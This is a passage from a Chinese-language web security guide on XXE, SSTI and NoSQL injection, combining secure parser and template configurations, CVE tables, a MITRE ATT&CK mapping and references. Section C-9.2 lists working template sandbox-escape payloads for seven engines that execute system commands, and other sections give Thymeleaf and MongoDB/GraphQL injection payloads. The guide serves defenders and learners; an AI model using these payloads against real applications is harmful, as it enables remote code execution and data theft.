    // SAXParserFactory 安全配置
    public static SAXParserFactory secureSAX() {
        SAXParserFactory spf = SAXParserFactory.newInstance();
        try {
            spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
            spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
            spf.setXIncludeAware(false);
        } catch (Exception e) {
            throw new RuntimeException("SAX 安全配置失败", e);
        }
        return spf;
    }
}
```

#### C-4.2 Python Jinja2 安全沙箱

```python
"""
Jinja2 安全配置 — 防御 SSTI

关键原则:
1. 永远使用 SandboxedEnvironment
2. 永远不要用 render_template_string 拼接用户输入
3. 限制可用过滤器和全局变量
"""

from jinja2 import Environment, BaseLoader
from jinja2.sandbox import SandboxedEnvironment, ImmutableSandboxedEnvironment

# === 方法 1: SandboxedEnvironment (推荐) ===
env = SandboxedEnvironment()

# 安全渲染 — 用户输入只作为变量传入
template = env.from_string("Hello {{ name }}!")
result = template.render(name=user_input)  # 安全

# === 方法 2: ImmutableSandboxedEnvironment (更严格) ===
env = ImmutableSandboxedEnvironment()
# 禁止修改任何对象属性

# === 方法 3: 自定义安全环境 ===
class SecureTemplateEnv(SandboxedEnvironment):
    """严格限制可用的函数和变量"""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        # 只注册安全的全局变量
        self.globals = {
            'range': range,
            'len': len,
            'upper': lambda s: s.upper(),
            'lower': lambda s: s.lower(),
        }
        # 禁止所有危险的属性访问
        self.is_safe_attribute = self._strict_attr_check

    def _strict_attr_check(self, obj, attr, default):
        """只允许白名单属性"""
        BLOCKED = {
            '__class__', '__mro__', '__subclasses__', '__bases__',
            '__globals__', '__builtins__', '__init__', '__import__',
            'popen', 'system', 'exec', 'eval', 'compile',
        }
        if attr in BLOCKED:
            return False
        return not attr.startswith('_')

# 使用示例
safe_env = SecureTemplateEnv()
template = safe_env.from_string(user_controlled_template)
result = template.render(data=trusted_data)

# === 重要: render_template vs render_template_string ===
# Flask 中的正确用法:
from flask import render_template

@app.route('/page/<name>')
def page(name):
    # 正确: 模板文件中的变量替换
    return render_template('page.html', name=name)

    # 错误: 将用户输入作为模板 (SSTI 风险!)
    # return render_template_string(f"Hello {name}")
```

#### C-4.3 Node.js MongoDB 参数化查询

```javascript
/**
 * MongoDB 安全查询模式 — 防御 NoSQL 注入
 *
 * 关键原则:
 * 1. 永远不要直接传递 req.query / req.body 到数据库查询
 * 2. 对所有输入进行类型验证
 * 3. 使用 mongo-sanitize 清理 $ 开头的键
 */

const express = require('express');
const { MongoClient, ObjectId } = require('mongodb');
const mongoSanitize = require('express-mongo-sanitize');
const { body, query, validationResult } = require('express-validator');

const app = express();
app.use(express.json());

// 中间件 1: 清理 $ 和 . 开头的键
app.use(mongoSanitize({
    replaceWith: '_',  // 替换而非删除
    allowDots: false,  // 禁止点号操作符
}));

// 中间件 2: 类型验证
const validateLogin = [
    body('username').isString().trim().escape(),
    body('password').isString().trim().isLength({ min: 1 }),
    (req, res, next) => {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ errors: errors.array() });
        }
        next();
    }
];

// 安全的登录查询
app.post('/login', validateLogin, async (req, res) => {
    const { username, password } = req.body;

    // 安全: 强制类型 + 显式查询构造
    const query = {
        username: String(username),
        password: String(password),  // 明文比较（生产环境应用 bcrypt）
    };

    try {
        const user = await db.collection('users').findOne(query);
        if (!user) {
            return res.status(401).json({ error: '认证失败' });
        }
        res.json({ message: '登录成功' });
    } catch (err) {
        res.status(500).json({ error: '服务器错误' });
    }
});

// 安全的搜索查询（白名单模式）
app.get('/users', async (req, res) => {
    // 白名单字段
    const ALLOWED_FIELDS = ['username', 'email', 'role', 'status'];
    const ALLOWED_OPERATORS = ['$eq', '$in', '$regex'];

    const query = {};

    for (const field of ALLOWED_FIELDS) {
        if (req.query[field]) {
            // 强制字符串类型 — 阻止对象注入
            query[field] = String(req.query[field]);
        }
    }

    // 如果需要支持复杂查询，使用显式构造
    if (req.query.role) {
        query.role = { $eq: String(req.query.role) };
    }

    try {
        const users = await db.collection('users')
            .find(query)
            .project({ password: 0 })  // 排除敏感字段
            .limit(50)                  // 限制返回数量
            .toArray();
        res.json(users);
    } catch (err) {
        res.status(500).json({ error: '服务器错误' });
    }
});

// 手动递归清理函数（备选方案）
function deepSanitize(obj) {
    if (typeof obj !== 'object' || obj === null) return obj;

    const cleaned = Array.isArray(obj) ? [] : {};
    for (const [key, value] of Object.entries(obj)) {
        // 删除 $ 开头的键（MongoDB 操作符）
        const safeKey = key.replace(/^\$/, '_REMOVED_');
        cleaned[safeKey] = typeof value === 'object' ? deepSanitize(value) : value;
    }
    return cleaned;
}
```

---

### C-5：更新 MITRE ATT&CK 映射

| Technique | ID | 适用攻击 | 说明 |
|-----------|-----|---------|------|
| Exploit Public-Facing Application | T1190 | XXE, SSTI, NoSQL 注入 | 所有三种攻击的初始入口 |
| Unsecured Credentials | T1552 | XXE 读配置/凭证文件 | 读取 /etc/shadow、应用配置 |
| Remote System Discovery | T1018 | XXE SSRF | 通过 XXE 探测内网 |
| Command and Scripting Interpreter | T1059 | SSTI RCE | 模板注入执行系统命令 |
| Application Layer Protocol | T1071 | XXE OOB HTTP/DNS 外带 | 数据外带通道 |
| Data from Local System | T1005 | XXE 文件读取 | 读取本地敏感文件 |
| Server Software Component | T1505 | Redis 写 Webshell/Cron | 持久化后门 |
| Ingress Tool Transfer | T1105 | XXE + FTP 外带 | 大文件数据传输 |
| Exploitation for Client Execution | T1203 | XXE via DOCX/XLSX | 文档载体攻击终端用户 |
| Abuse Elevation Control Mechanism | T1548 | MongoDB $where 提权 | JavaScript 执行绕过权限 |
| External Remote Services | T1133 | CouchDB Erlang RCE | 利用服务端口远程控制 |
| Software Discovery | T1518 | SSTI 信息收集 | 通过模板引擎枚举软件 |
| Payload Development: Install Capability | T1620 | Redis 主从复制 RCE | 恶意模块加载 |

### C-6：2025 年相关 CVE 参考

| CVE | 影响 | 组件 | 描述 |
|-----|------|------|------|
| CVE-2025-70830 | RCE | Datart (Freemarker) | SQL 脚本字段 Freemarker SSTI |
| CVE-2025-66434 | RCE | Jinja2 应用 | 用户控制模板导致任意代码执行 |
| CVE-2023-4450 | RCE | Freemarker (JDK 17+) | 高版本 JDK 模块化限制绕过 |

---

### 参考资料

- [CVE-2025-70830: Datart Freemarker SSTI](https://github.com/xiaoxiaoranxxx/CVE-2025-70830)
- [CVE-2025-66434: Jinja2 SSTI (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2025-66434)
- [JDK 17+ FreeMarker SSTI 绕过](https://whoopsunix.com/docs/java/named%20module/)
- [SSTI 模板注入命令执行与绕过技巧](https://cloud.tencent.com/developer/article/2125012)
- [Java 模板引擎 SSTI 分析 (跳跳糖)](https://tttang.com/archive/1412/)
- [PortSwigger SSTI 教程](https://www.anquanke.com/post/id/246293)

---

### C-7：2025-2026 最新 CVE 与研究案例（关键）

#### C-7.1 Thymeleaf CVE-2026-40478 — 表达式沙箱绕过（CVSS 9.1）

- **影响版本**: Thymeleaf 3.1.3.RELEASE（及之前）
- **修复版本**: 3.1.4+
- **根本原因**: 解析表达式时，**空白字符（whitespace）**处理不当导致表达式黑名单/沙箱绕过
- **触发条件**: 应用接受用户输入作为视图名或片段名（fragment），但仅当返回的视图名可控时利用
- **POC 思路**:
```java
// 漏洞代码：控制器返回的视图名拼接用户输入
@GetMapping("/page")
public String page(@RequestParam String name) {
    return "page :: " + name;  // ❌ Fragment expression 注入点
}

// Payload（绕过 3.1.2/3.1.3 的黑名单）
// 关键: 利用 whitespace 让黑名单 regex 不匹配
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.::
```
- **参考**:
  - [Endor Labs — CVE-2026-40478 分析](https://www.endorlabs.com/learn/its-about-thyme-how-a-whitespace-character-broke-thymeleafs-expression-sandbox-cve-2026-40478)
  - [Snyk — Thymeleaf Injection](https://snyk.io/blog/thymeleaf-injection/)

#### C-7.2 Thymeleaf 3.1.2 黑名单绕过（RWCTF 2024 ChatterBox）

[wh1t3p1g's blog — Thymeleaf SSTI 3.1.2 黑名单绕过](https://blog.0kami.cn/blog/2024/thymeleaf%20ssti%203.1.2%20黑名单绕过/) 以 RWCTF 2024 赛题为案例：
- 3.1.2 引入 expression 黑名单（如 `T(...)`, `new`, `getClass` 等）
- 通过 PostgreSQL JDBC 反序列化 + Spring SpEL 联合利用
- 通过反射访问 `Class.forName` 间接调用

#### C-7.3 Spring Boot 3.3.4 SSTI → 未认证 RCE（modzero 2025）

[modzero — Spring Boot SSTI](https://modzero.com/en/blog/spring_boot_ssti/) 披露 2025 实战案例：
- 目标：硬化的 Spring Boot 3.3.4 应用
- 漏洞：用户可控的视图名 → Thymeleaf SSTI
- 利用：未认证 RCE
- **教训**: 即使升级到最新 Spring Boot 3.x，**只要控制器写法不安全，仍然可被 SSTI**

#### C-7.4 CVE-2025-53833 — LaRecipe SSTI（2025）

- **影响**: LaRecipe < 2.8.1（Laravel 文档工具）
- **漏洞**: 未授权 SSTI → 任意命令执行 + 敏感文件读取
- **参考**: [腾讯云 — CVE-2025-53833 深度剖析](https://cloud.tencent.com/developer/article/2630093)

#### C-7.5 XXE CVE 集合（2025-2026）

| CVE | 产品 | 类型 | 来源 |
|------|------|------|------|
| **CVE-2025-49493** | Akamai CloudTest | XXE（多个 SOAP 端点） | [XBOW Writeup](https://xbow.com/blog/xbow-akamai-cloudtest-xxe) |
| **CVE-2025-30220** | GeoServer WFS | XXE 处理 | [Kudelski Security](https://kudelskisecurity.com/research/xml-external-entity-xxe-processing-vulnerability-in-geoserver-wfs-service-cve-2025-30220) |
| **CVE-2025-2775/2777** | SysAid ITSM | XXE | SonicWall |
| **CVE-2025-13096** | IBM Business Automation Workflow | XXE | IBM Security Bulletin |
| **CVE-2025-66516** | Apache Tika | XXE | Akamai |
| **CVE-2025-68493** | Apache Struts（CVSS 9.8） | 多种 | Gopher Security |
| **CVE-2026-28809** | esaml SAML 库 | XXE | SentinelOne |
| **CVE-2025-47949** | samlify Node.js SAML 库 | SSO 绕过 | [Endor Labs](https://www.endorlabs.com/learn/cve-2025-47949-reveals-flaw-in-samlify-that-opens-door-to-saml-single-sign-on-bypass) |

---

### C-8：MongoDB Aggregation Pipeline 注入与 GraphQL NoSQL

#### C-8.1 Aggregation Pipeline 注入（Soroush Dalili 研究）

[Soroush.me — MongoDB Aggregation Pipeline Injection](https://soroush.me/blog/mongodb-nosql-injection-with-aggregation-pipelines) 揭示：很多开发者以为 MongoDB `find()` 安全，但**聚合管道同样可注入**。

**漏洞模式**:
```javascript
// 漏洞代码：直接将用户输入拼入 $match
const pipeline = [
    { $match: JSON.parse(req.query.filter) },  // ❌ 用户控制 filter
    { $group: { _id: '$category', total: { $sum: '$amount' } } }
];
db.orders.aggregate(pipeline);

// 攻击 payload:
?filter[$where]=this.password=='x'  // JS 注入
?filter={"$or": [{"status": "active"}, {"$expr": {"$gt": ["$balance", 0]}}]}
```

**防御**:
```javascript
// ✅ 强类型校验
const filter = {};
if (typeof req.query.status === 'string') {
    filter.status = req.query.status;
}
// ✅ 禁止 $where / $expr / $func
const FORBIDDEN = ['$where', '$func', '$accumulator'];
function sanitize(obj) {
    for (const k in obj) {
        if (FORBIDDEN.includes(k)) delete obj[k];
        else if (typeof obj[k] === 'object') sanitize(obj[k]);
    }
    return obj;
}
```

#### C-8.2 GraphQL + MongoDB 联合漏洞

[Medium — GraphQL + MongoDB Security](https://medium.com/@mrthankyou/learning-graphql-mongodb-security-vulnerabilities-b52f7e26ee24) 和 [APIsec — NoSQL in APIs](https://www.apisec.ai/blog/nosql-injection-api-detection-prevention-guide)：

**漏洞模式**:
```graphql
# GraphQL Resolver 直接传递 args 到 MongoDB
type Query {
  user(filter: JSON): User
}

# Resolver:
const resolvers = {
  Query: {
    user: (_, { filter }) => db.collection('users').findOne(filter)
    // ❌ 客户端可发送 filter: { password: { $ne: null } }
  }
};
```

**攻击查询**:
```graphql
query {
  user(filter: "{\"password\": {\"$ne\": null}, \"username\": \"admin\"}") {
    username
    password
  }
}
```

**防御**:
- GraphQL schema 强类型，不接受 JSON 标量
- Resolver 内部做字段白名单
- 使用 Mongoose `sanitizeFilter`
- 限制 GraphQL 查询深度（防嵌套 $where）

#### C-8.3 Mongoose sanitizeFilter（2025 推荐防御）

[Mongoose 文档](https://mongoosejs.com/docs/api/mongoose.html#mongoose_Mongoose-sanitizeFilter):
```javascript
// 6.x+ 内置
const filter = mongoose.sanitizeFilter({
    username: 'admin',
    password: { $ne: null }  // 自动转为 { $eq: { $ne: null } }
});

// 等价于: { username: 'admin', password: { $eq: { $ne: null } } }
// → MongoDB 视为字面值比较，不会触发 $ne 操作符
```

---

### C-9：SSTI 沙箱逃逸工具与最新研究

#### C-9.1 学术研究 — USENIX 2023 / ACM 2025

- **USENIX 2023** [《Remote Code Execution from SSTI in the Sandbox》](https://www.usenix.org/conference/usenixsecurity23/presentation/zhao-yudi): 系统性研究模板沙箱逃逸
- **ACM 2025** [《An Assessment of the Overlooked Dangers of SSTI》](https://dl.acm.org/doi/pdf/10.1145/3799796?download=true): 综合调研 + 最新攻击方法
- **arXiv 2024** [《A Survey of the Overlooked Dangers of Template Engines》](https://arxiv.org/html/2405.01118v1): 全引擎覆盖

#### C-9.2 各引擎最新沙箱逃逸 Payload（2025）

**Jinja2 (Python) — Python 沙箱逃逸**:
```python
# 标准: {{ ''.__class__.__mro__[1].__subclasses__() }}
# 找到 subprocess.Popen 或 os.system

# 绕过黑名单 (过滤 .__class__)
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}

# 绕过 . 过滤
{{ config['__class__']['__init__']['__globals__']['os']['popen']('id')['read']() }}

# 利用 cycler / joiner / namespace (Jinja 内置)
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# 利用 request 对象 (Flask)
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Polyglot 检测字符串
{{7*7}}${7*7}<%= 7*7 %>${{7*7}}=#{7*7}
```

**FreeMarker (Java) — Execute / ObjectConstructor**:
```java
<#-- 标准: -->
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

<#-- 绕过 new 黑名单 (使用 .api) -->
${object?api.class.protectionDomain.classLoader.loadClass("freemarker.template.utility.Execute").newInstance()?no_escape}

<#-- JDK 17+ 模块化绕过 -->
<#assign clz = object?api.class.protectionDomain.classLoader>
<#assign ex = clz.loadClass("freemarker.template.utility.Execute")>
${ex.getMethod("exec", clz.loadClass("java.lang.String")).invoke(ex.newInstance(), "id")}
```

**Velocity (Java)**:
```java
#set($e="exp")
#set($class=$e.class.forName("java.lang.Runtime"))
#set($method=$class.getMethod("getRuntime", $null))
#set($instance=$method.invoke($null, $null))
#set($cmd=$instance.exec("id"))
$cmd.waitFor()

#set($chr=$e.class.forName("java.lang.Character"))
#set($str=$e.class.forName("java.lang.String"))
#set($ex=$e.class.forName("java.lang.Runtime").getMethod("getRuntime",$null).invoke($null,$null).exec($chr.toString(105)+$chr.toString(100)))
```

**Thymeleaf (Spring)**:
```java
// View name 注入
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.::
// URL: /doc/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.::

// 3.1.2 黑名单绕过 (RWCTF 2024)
// 利用 Spring SpEL 表达式
${T(java.lang.Runtime).getRuntime().exec('id')}
```

**Pebble (Java)**:
```java
{% set cmd = 'id' %}
{% set bytes = ins[0].getClass().forName('java.lang.Runtime').getMethod('exec', ins[0].getClass().forName('[Ljava.lang.String;')).invoke(ins[0].getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null), cmd.split(' ')) %}
```

**Handlebars (Node.js)**:
```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Mako (Python)**:
```python
<%
import os
x = os.popen('id').read()
%>
${x}

<%self:filter value="mako.filter.escape"/>
${self.module.cache.util.os.system('id')}
```

#### C-9.3 SSTI 自动化工具

| 工具 | 用途 | 链接 |
|------|------|------|
| **Tplmap** | 类似 sqlmap 的 SSTI 利用 | [github/epinna/tplmap](https://github.com/epinna/tplmap) |
| **SSTImap** | 现代 SSTI 检测利用 | [github/vladko312/SSTImap](https://github.com/vladko312/SSTImap) |
| **Dalfox** | 通用 Web 扫描（含 SSTI） | [github/hahwul/dalfox](https://github.com/hahwul/dalfox) |
| **Burp Suite + SSTI bug bounty** | 手工 + 自动 | [PortSwigger SSTI](https://portswigger.net/research/server-side-template-injection) |

#### C-9.4 SSTI 防御最新原则（2025-2026）

| 原则 | 说明 |
|------|------|
| **永远不拼接用户输入到模板字符串** | 必须作为参数传入 |
| **沙箱不可信** | 即使引擎有沙箱，也要做输入校验 |
| **使用逻辑分离的模板文件** | 模板文件由开发者写，不暴露给用户 |
| **限制模板可调用的方法** | FreeMarker `setAPIBuiltinEnabled(false)`；Jinja `SandboxedEnvironment` |
| **升级到最新版** | Thymeleaf 3.1.4+；FreeMarker 2.3.34+；Jinja 3.1.5+ |
| **审计动态视图名** | Spring 控制器不要直接返回 request param 作为 view name |
| **SAST 检测** | CodeQL / Semgrep 规则识别 SSTI 模式 |

---

### C-10：2025-2026 综合 CVE 速查

#### C-10.1 XXE 关键 CVE

| CVE | 产品 | 影响 |
|------|------|------|
| CVE-2025-49493 | Akamai CloudTest | SOAP 端点 XXE |
| CVE-2025-30220 | GeoServer WFS | XXE 处理 |
| CVE-2025-2775/2777 | SysAid ITSM | XXE |
| CVE-2025-13096 | IBM Business Automation Workflow | XXE |
| CVE-2025-66516 | Apache Tika | XXE |
| CVE-2025-68493 | Apache Struts（CVSS 9.8） | XXE + 其他 |
| CVE-2026-28809 | esaml SAML 库 | XXE |
| CVE-2025-47949 | samlify Node.js SSO 绕过 | SSO 认证绕过 |

#### C-10.2 SSTI 关键 CVE

| CVE | 产品 | 影响 |
|------|------|------|
| CVE-2026-40478 | Thymeleaf 3.1.3 | 沙箱绕过（CVSS 9.1） |
| CVE-2025-70830 | Datart Freemarker | 认证 SSTI → RCE |
| CVE-2025-66434 | Jinja2 应用 | 用户控制模板 → RCE |
| CVE-2025-53833 | LaRecipe | 未授权 SSTI |
| CVE-2023-4450 | Freemarker (JDK 17+) | 模块化限制绕过 |

#### C-10.3 NoSQL 关键 CVE

| CVE/Advisory | 产品 | 影响 |
|------|------|------|
| CVE-2025-2691 | nossrf (npm) | 自身可绕过 |
| 多个 | Mongoose < 6.x | sanitizeFilter 未启用 |

---

### C-11：奇安信/中文社区精华补充

#### C-11.1 奇安信攻防社区

- [Java 中 SSTI 漏洞分析](https://mdr.skyeye.qianxin.com/forum/share/1661) — FreeMarker Execute 类利用详解
- 持续关注 [奇安信攻防社区](https://forum.butian.net/community/all) 漏洞分析与复现板块

#### C-11.2 跳跳糖 / 博客园

- [跳跳糖 — 服务器端模板注入 SSTI 分析与归纳](https://tttang.com/archive/1412/) — 三种 Java 引擎系统对比
- [博客园 — Java 模板引擎注入 SSTI 漏洞研究](https://www.cnblogs.com/LittleHann/p/17846825.html)

#### C-11.3 RWCTF / 强网榜实战

- [wh1t3p1g — Thymeleaf SSTI 3.1.2 黑名单绕过](https://blog.0kami.cn/blog/2024/thymeleaf%20ssti%203.1.2%20黑名单绕过/)
- [pankas — 探索 Spring 下 SSTI 通用方法](https://pankas.top/2024/02/12/探索spring下ssti通用方法/)
- [稀土掘金 — 强网杯 hellospring SSTI 学习](https://juejin.cn/post/7331992322232303652)

#### C-11.4 阿里云 / 腾讯云

- [阿里云 — Java 安全之 Thymeleaf 模板注入漏洞](https://developer.aliyun.com/article/1235821)
- [腾讯云 — LaRecipe SSTI CVE-2025-53833](https://cloud.tencent.com/developer/article/2630093)
- [腾讯云 — SSTI 模板注入命令执行与绕过技巧](https://cloud.tencent.com/developer/article/2125012)

---

### C-12：2025-2026 防御升级路线图

| 层级 | 措施 | 优先级 |
|------|------|--------|
| **XXE 防御** | 禁用 DTD 处理 + 外部实体 | P0 |
| **XXE 防御** | 升级 XML 解析库（Xerces、libxml2、Python xml） | P0 |
| **XXE 防御** | 文件上传白名单 + magic bytes 校验 | P1 |
| **XXE 防御** | Office/SVG 文件单独沙盒解析 | P1 |
| **SSTI 防御** | 模板文件由开发者写，用户输入仅作为参数 | P0 |
| **SSTI 防御** | 升级 Thymeleaf 3.1.4+、FreeMarker 2.3.34+、Jinja 3.1.5+ | P0 |
| **SSTI 防御** | 禁用引擎的危险 API（setAPIBuiltinEnabled(false)） | P1 |
| **SSTI 防御** | 审计 Spring 控制器，避免动态视图名 | P0 |
| **SSTI 防御** | SAST 规则识别 SSTI 模式 | P1 |
| **NoSQL 防御** | 强类型校验 + 白名单字段 | P0 |
| **NoSQL 防御** | Mongoose sanitizeFilter | P0 |
| **NoSQL 防御** | 禁用 $where / $expr / $func | P0 |
| **NoSQL 防御** | GraphQL schema 强类型，不接受 JSON 标量 | P1 |
| **检测** | 日志检测异常 XML / 模板字符串 | P2 |
| **应急** | 订阅 GHSA / NVD，及时升级模板引擎 | P1 |

---

### C-13：参考资源更新

**XXE**:
- [PortSwigger — XXE Reference](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings — XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)
- [HackTricks — XXE](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)
- [XBOW — CVE-2025-49493 Akamai XXE](https://xbow.com/blog/xbow-akamai-cloudtest-xxe)
- [Kudelski — CVE-2025-30220 GeoServer XXE](https://kudelskisecurity.com/research/xml-external-entity-xxe-processing-vulnerability-in-geoserver-wfs-service-cve-2025-30220)
- [YesWeHack — XXE Bug Bounty Guide](https://www.yeswehack.com/learn-bug-bounty/xml-external-entity-guide-xxe)
- [appsec.fyi — XXE Resources](https://appsec.fyi/xxe.html)

**SSTI**:
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
- [HackTricks — SSTI](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
- [PortSwigger — SSTI Research](https://portswigger.net/research/server-side-template-injection)
- [Endor Labs — CVE-2026-40478 Thymeleaf](https://www.endorlabs.com/learn/its-about-thyme-how-a-whitespace-character-broke-thymeleafs-expression-sandbox-cve-2026-40478)
- [Snyk — Thymeleaf Injection](https://snyk.io/blog/thymeleaf-injection/)
- [modzero — Spring Boot SSTI](https://modzero.com/en/blog/spring_boot_ssti/)
- [wh1t3p1g — Thymeleaf 3.1.2 绕过](https://blog.0kami.cn/blog/2024/thymeleaf%20ssti%203.1.2%20黑名单绕过/)
- [USENIX 2023 — SSTI Sandbox Escape](https://www.usenix.org/conference/usenixsecurity23/presentation/zhao-yudi)
- [ACM 2025 — SSTI Dangers](https://dl.acm.org/doi/pdf/10.1145/3799796?download=true)
- [arXiv — Template Engines Survey](https://arxiv.org/html/2405.01118v1)
- [tplmap](https://github.com/epinna/tplmap) / [SSTImap](https://github.com/vladko312/SSTImap)

**NoSQL**:
- [PayloadsAllTheThings — NoSQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/NoSQL%20Injection/)
- [PortSwigger — NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
- [Soroush Dalili — MongoDB Aggregation Pipeline Injection](https://soroush.me/blog/mongodb-nosql-injection-with-aggregation-pipelines)
- [APIsec — NoSQL in APIs](https://www.apisec.ai/blog/nosql-injection-api-detection-prevention-guide)
- [Mongoose sanitizeFilter](https://mongoosejs.com/docs/api/mongoose.html#mongoose_Mongoose-sanitizeFilter)
